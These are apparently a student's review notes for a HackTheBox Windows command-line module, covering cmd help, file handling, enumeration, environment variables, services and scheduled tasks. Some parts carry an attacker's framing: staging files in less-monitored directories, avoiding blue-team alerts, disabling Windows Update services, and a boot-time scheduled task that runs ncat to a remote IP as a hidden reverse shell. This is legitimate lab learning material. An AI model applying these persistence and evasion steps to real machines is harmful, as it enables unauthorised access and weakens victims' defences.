# Introduction to Windows Command Line 
Brief notes written to review the material in the HackTheBox module, Introduction to Windows Command Line.

## Command Prompt Vs. PowerShell

|PowerShell|	Command Prompt|
|:-:|:-:|
|Introduced in 2006|	Introduced in 1981|
|Can run both batch commands and PowerShell cmdlets|	Can only run batch commands|
|Supports the use of command aliases|	Does not support command aliases|
|Cmdlet output can be passed to other cmdlets|	Command output cannot be passed to other commands|
|All output is in the form of an object|	Output of commands is text|
|Able to execute a sequence of cmdlets in a script|	A command must finish before the next command can run|
|Has an Integrated Scripting Environment (ISE)|	Does not have an ISE|
|Can access programming libraries because it is built on the .NET framework|	Cannot access these libraries|
|Can be run on Linux systems|	Can only be run on Windows systems|

To connect to the target hosts as the user via SSH, utilize the following format:
```
ssh <username>@<IP-Address>

Once connected, you will be asked to accept the host's certificate and provide the user's password to log in completely.
```

# Command Prompt 
To access command prompt. From the desktop, we can open up the command prompt by:

- Using the Windows key + r to bring up the run prompt, and then typing in cmd. OR
- Accessing the executable from the drive path C:\Windows\System32\cmd.exe.

For remote access, we can do this through the use of telnet(insecure and not recommended), Secure Shell (SSH), PsExec, WinRM, RDP, or other protocols as needed.

### How to Get Help
Finding help is as easy as typing help. Without any additional parameters, this command provides a list of built-in commands and basic information about each displayed command's usage. 

To print out detailed information about a particular command, we can issue the following: help 'command name'.

Certain commands do not have a help page associated with them. However, they will redirect you to running the proper command to retrieve the desired information. For example, running help ipconfig.
```
C:\htb> help ipconfig

This command is not supported by the help utility. Try "ipconfig /?".
```
Be aware that several commands use the /? modifier interchangeably with help.

The help utility serves as an offline manual for CMD and DOS compatible Windows operating system commands. This utility is very similar to the Man pages on Linux based systems. 

### Command History
We have a few options to look up previously ran commands in our current session:

- Arrow keys (up and down)
- Page up and page down keys
- F7 key
- doskey /history command

### Exploring the File System
We can get a printout of the entire path we specify and its subdirectories by utilizing the tree command. We can utilize the /F parameter with the tree command to see a listing of each file and the directories along with the directory tree of the path.

### Interesting Directories

|Name|	Location|	Description|
|:-:|:-:|:-:|
|%SYSTEMROOT%\Temp|	C:\Windows\Temp|	Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.
|%TEMP%|	C:\Users\user\AppData\Local\Temp|	Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.
|%PUBLIC%|	C:\Users\Public|	Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.
|%ProgramFiles%|	C:\Program Files|	Folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.
|%ProgramFiles(x86)%	|C:\Program Files (x86)|	Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.

### Delete Directories
Deleting directories can be accomplished using the rd or rmdir commands. The commands rd and rmdir are explicitly meant for removing directory trees and do not deal with specific files or attributes. Rd has a switch /S that we can utilize to erase the directory and its contents.

### Using Xcopy and Robocopy
Instead of the copy command, Xcopy prompts us during the process and displays the result. Utilizing the /E switch, we told Xcopy to copy any files and subdirectories to include empty directories. Keep in mind this will not delete the copy in the previous directory. When performing the duplication, xcopy will reset any attributes the file had. If you wish to retain the file's attributes ( such as read-only or hidden ), you can use the /K switch.

Robocopy is xcopy's successor built with much more capability. Robocopy can copy and move files locally, to different drives, and even across a network while retaining the file data and attributes to include timestamps, ownership, ACLs, and any flags set like hidden or read-only. We need to be aware that Robocopy was made for large directories and drive syncing, so it does not like to copy or move singular files by default.

### List Files & View Their Contents
We can utilize the more, openfiles, and type commands.

-  more: With this built-in tool, we can view the contents of a file or the results of another command printed to it one screen at a time. We can use the /S option to crunch that blank space down to a single line at each point to make it easier to view.
-  openfiles: we can see what file on our local pc or a remote host has open and from which user. This command requires administrator privileges on the host you are trying to view. With this tool, we can view open files, disconnect open files, and even kick users from accessing specific files. The ability to use this command is not enabled by default on Windows systems.
-  type: can display the contents of multiple text files at once. It is also possible to utilize file redirection with type as well. One interesting thing about type is that it will not lock files. We can also use it to send output to another file. This can be a quick way to write a new file or append data to another file with >>.

### Create And Modify A File
We have options including echo, fsutil, ren, rename, and replace. 

First, echo with output redirection allows us to modify a file if it already exists or create a new file at the time of the call.
```
C:\Users\htb\Desktop>echo Check out this text > demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text

C:\Users\htb\Desktop>echo More text for our demo file >> demo.txt

C:\Users\htb\Desktop>type demo.txt
Check out this text
More text for our demo file
```

Ren allows us to change the name of a file to something new.
```
C:\Users\htb\Desktop> ren demo.txt superdemo.txt

C:\Users\htb\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/22/2021  04:14 PM                52 superdemo.txt

              13 File(s)         42,618 bytes
               7 Dir(s)  39,091,531,776 bytes free
```

With fsutil, we can do many things, example below shows creating a file with permissions.
```
C:\Users\htb\Desktop>fsutil file createNew for-sure.txt 222
File C:\Users\htb\Desktop\for-sure.txt is created

C:\Users\htb\Desktop>echo " my super cool text file from fsutil "> for-sure.txt

C:\Users\htb\Desktop>type for-sure.txt
" my super cool text file from fsutil "
```

### Input and Output
Using > this way will create the file if it does not exist, or it will overwrite the specified file's contents. To append to an already populated file, we can utilize >>.

We can feed input from a file into a command with <.
```
C:\Users\htb\Documents> echo a b c d e > test.txt
C:\Users\htb\Documents>echo f g h i j k see how this works now? >> test.txt

C:\Users\htb\Documents>find /i "see" < test.txt

f g h i j k see how this works now?
```

### Viewing Hidden Files
 dir /A:H meaning dir all:hidden

### Removing Hidden Files
del /A:H 

## Gathering System Information
What Types of Information Can We Gather from the System?

|Type|	Description|
|:-:|:-:|
|General System Information|	Contains information about the overall target system. Target system information includes but is not limited to the hostname of the machine, OS-specific details (name, version, configuration, etc.), and installed hotfixes/patches for the system.
|Networking Information|	Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: host IP address, available network interfaces, accessible subnets, DNS server(s), known hosts, and network resources.
|Basic Domain Information|	Contains Active Directory information regarding the domain to which the target system is connected.
|User Information|	Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as environment variables, currently running tasks, scheduled tasks, and known services.

### Why Do We Need This Information?
Our goal with host enumeration here is to use the information gained from the target to provide us with a starting point and guide for how we wish to attack the system. 

### How Do We Get This Information?
CMD provides a one-stop shop for information via the systeminfo command. It is excellent for finding relevant information about the host, such as hostname, IP address(es), if it belongs to a domain, what hotfixes have been installed, and much more. 

Alternatively, to retrieve some basic system information such as the hostname or OS version, we can use the hostname and ver utilities built into the command prompt. The hostname utility follows its namesake and provides us with the hostname of the machine, whereas the ver command prints out the current operating system version number.

The arp utility effectively displays the contents and entries contained within the Address Resolution Protocol (ARP) cache. We can also use this command to modify the table entries effectively.

Whoami allows us to display the user, group, and privilege information for the user that is currently logged in. whoami /priv and whoami /groups

Net User allows us to display a list of all users on a host, information about a specific user, and to create or delete users.

In addition to user accounts, we should also take a quick look into what groups exist across the network. We can achieve this by utilizing the net group and net localgroup commands. Net group must be run against a domain server such as the DC, while net localgroup can be run against any host to show us the groups it contains.

Net Share allows us to display info about shared resources on the host and to create new shared resources as well.

Net View will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.

In a standard environment, cmd-prompt usage is not a common thing for a regular user. With that in mind, using net * commands within an environment is not a normal thing either, and can be one way to alert on potential infiltration of a networked host easily. With proper monitoring and logging enabled, we should spot these actions quickly and use them to triage an incident before it gets too far out of hand.

## Finding Files and Directories
The where command can look through folders automatically. To ensure we dig through all directories within a path, we can use the /R switch.
```
where /R C:\Users\student\ bio.txt
Will only look through authorized directories. Use admin privilege to check more directories.
```

Find is used to search for text strings or their absence within a file or files. You can also use find against the console's output or another command. Where find is limited, however, is its capability to utilize wildcard patterns in its matching. 
We can modify the way find searches using several switches:

- /V modifier can change our search from a matching clause to a Not clause.
- /N switch to display line numbers.
- /I display to ignore case sensitivity.

The findstr command is similar to find in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. findstr is closer to grep.

### Evaluating and Sorting Files
Comp will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the /A modifier if we want to see the differences in ASCII format. The /L modifier can also provide us with the line numbers.

FC differs in that it will show you which lines are different, not just an individual character (/A) or byte that is different on each line.

Sort, we can receive input from the console, pipeline, or a file, sort it and send the results to the console or into a file or another command.

## Environment Variables
Environment variables are settings that are often applied globally to our hosts. They can be found on Windows, Linux, and macOS hosts. This concept is not specific to one OS type, but they function differently on each OS. Environment variables can be accessed by most users and applications on the host and are used to run scripts and speed up how applications function and reference data. On a Windows host, environment variables are not case sensitive and can have spaces and numbers in the name. The only real catch we will find is that they cannot have a name that starts with a number or include an equal sign.

### Variable Scope

- Global variables are accessible globally. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.
- Local variables are only accessible within a local context. Local means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.

Windows, like any other program, contains its own set of variables known as Environment Variables. These variables can be separated into their defined scopes known as System and User scopes. Additionally, there is one more defined scope known as the Process scope:

|Scope|	Description|	Permissions Required to Access|	Registry Location|
|:-:|:-:|:-:|:-:|
|System (Machine)|	The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.|	Local Administrator or Domain Administrator|	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
|User|	The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.|	Current Active User, Local Administrator, or Domain Administrator|	HKEY_CURRENT_USER\Environment
|Process|	The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process).|	Current Child Process, Parent Process, or Current Active User|	None (Stored in Process Memory)

### Managing Environment Variables
Both set and setx are command line utilities that allow us to display, set, and remove environment variables. The set utility only manipulates environment variables in the current command line session. But suppose we need to make permanent changes to environment variables. In that case, we can use setx to make the appropriate changes to the registry, which will exist upon restart of our current command prompt session.

### Important Environment Variables

|Variable Name|	Description|
|:-:|:-:|
|%PATH%|	Specifies a set of directories(locations) where executable programs are located.
|%OS%	|The current operating system on the user's workstation.
|%SYSTEMROOT%	|Expands to C:\Windows. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.
|%LOGONSERVER%	|Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.
|%USERPROFILE%|	Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}.
|%ProgramFiles%|	Equivalent of C:\Program Files. This location is where all the programs are installed on an x64 based system.
|%ProgramFiles(x86)%|	Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)

## Managing Services
SC (Service Controller) is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network. There's other tools, like Windows Management Instrumentation (WMIC) and Tasklist that can also query and manage services for local and remote hosts. 

Let's see what services are currently actively running on the system. We can do so by issuing the following command: sc query type= service.

Note: The spacing for the optional query parameters is crucial. For example, type= service, type=service, and type =service are completely different ways of spacing this parameter. 

Check if Windows Defender is enabled: sc query windefend

### Stopping and Starting Services
```
C:\htb> sc stop windefend

Access is denied.
```
Our current user doesn't have the proper permissions to stop or pause this particular service. To perform this action, we would likely need the permissions of an Administrator account but in some cases, certain services can only be handled by the system itself.

As an attacker, learning the restrictions behind what certain accounts have access or lack of access to is very important because blindly trying to stop services will fill the logs with errors and trigger any alerts showing that a user with insufficient privileges is trying to access a protected process on the system. This will catch the blue team's attention to our activities and begin a triage attempt to kick us off the system and lock us out permanently.

### Starting Services
```
C:\WINDOWS\system32> sc start Spooler
```

Although stopping services seems to offer a bit more practicality at first to the red team, being able to start services can lend itself to be especially useful in conjunction with being able to modify existing services. Typically services will take a few seconds or so to initialize after a request to start is issued.

### Modifying Services

Disabling Windows Updates Using SC:

To configure services, we must use the config parameter in sc. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (SCM). Remember that all changes to existing services will only fully update after restarting the service.

Windows updates rely on two services:

|Service|	Display Name|
|:-:|:-:|
|wuauserv|	Windows Update Service
|bits|	Background Intelligent Transfer Service

```
C:\WINDOWS\system32> sc query wuauserv
SERVICE_NAME: wuauserv
        TYPE               : 30  WIN32
        STATE              : 1  STOPPED

C:\WINDOWS\system32> sc query bits
SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING

C:\WINDOWS\system32> sc stop bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING

C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS

C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS

C:\WINDOWS\system32> sc start wuauserv 

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

C:\WINDOWS\system32> sc start bits

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
```
Note: This change will persist upon reboot. To revert everything back to normal, you can set start= auto to make sure that the services can be restarted and function appropriately.

### Other Routes to Query Services
Using Tasklist: Tasklist is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the /svc parameter to provide a list of services running under each process on the system. 

Using Net Start: Net start is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to net start, there is also net stop, net pause, and net continue. These will behave very similarly to sc as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.

Using WMIC: The Windows Management Instrumentation Command (WMIC) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. To list all services existing on our system and information on them, we can issue the following command: wmic service list brief .

## Working With Scheduled Tasks
Triggers That Can Kick Off a Scheduled Task: 
- When a specific system event occurs.
- At a specific time. (Day/Week/Month)
- When the computer enters an idle state.
- When the task is registered.
- When the system is booted.
- When a user logs on.
- When a Terminal Server session changes state.

Schtasks command line utility:

Schtasks /Query Parameters:
|Parameter	|Description|
|:-:|:-:|
|/fo	|Sets formatting options. We can specify to show results in the Table, List, or CSV output.
|/v	|Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.
|/nh|	Simplifies the output using the Table or CSV output format. This switch removes the column headers.
|/s	|Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\host".
|/u|	This switch will tell schtasks to run the following command with the permission set of the user specified.
|/p	|Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.

EX: SCHTASKS /Query /V /FO list

Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- /create : to tell it what we are doing
- /sc : we must set a schedule
- /tn : we must set the name
- /tr : we must give it an action to take

```
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

### Change the Properties of a Scheduled Task

|Parameter	|Description|
|:-:|:-:|
|/tn|	Designates the task to change
|/tr|	Modifies the program or action that the task runs.
|/ENABLE|	Change the state of the task to Enabled.
|/DISABLE|	Change the state of the task to Disabled.

```
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```
### Delete the Scheduled Task(s)

|Parameter	|Description|
|:-:|:-:|
|/tn|	Identifies the task to delete.
|/s|	Specifies the name or IP address to delete the task from.
|/u|	Specifies the user to run the task as.
|/p|	Specifies the password to run the task as.
|/f|	Stops the confirmation warning.

```
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

# PowerShell
